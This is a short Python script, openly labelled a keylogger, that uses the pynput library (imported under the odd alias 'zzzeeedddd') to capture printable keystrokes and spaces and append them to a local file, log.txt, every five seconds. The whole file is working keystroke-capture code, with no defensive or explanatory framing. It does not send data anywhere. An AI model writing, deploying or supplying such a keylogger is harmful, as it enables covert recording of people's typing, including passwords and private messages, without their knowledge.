import pynput as zzzeeedddd
import time
import string


# Keylogger with pynput
class Keylogger:
    def __init__(self, time_interval, file_path):
        self.log = ""
        self.interval = time_interval
        self.path = file_path
        self.start_time = time.time()

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_time = time.time()
            if current_time - self.start_time >= self.interval:
                self.start_time = current_time
                self.write_log()
                self.log = ""
            if key == zzzeeedddd.keyboard.Key.space:
                self.append_to_log(" ")
            elif key.char in string.printable:
                self.append_to_log(str(key.char))
            # else:
            #     self.append_to_log(str(key))
        except AttributeError:
            pass

    def write_log(self):
        with open(self.path, "a") as f:
            f.write(self.log)

    def start(self):
        keyboard_listener = zzzeeedddd.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            keyboard_listener.join()


if __name__ == "__main__":
    keylogger = Keylogger(5, "log.txt")
    keylogger.start()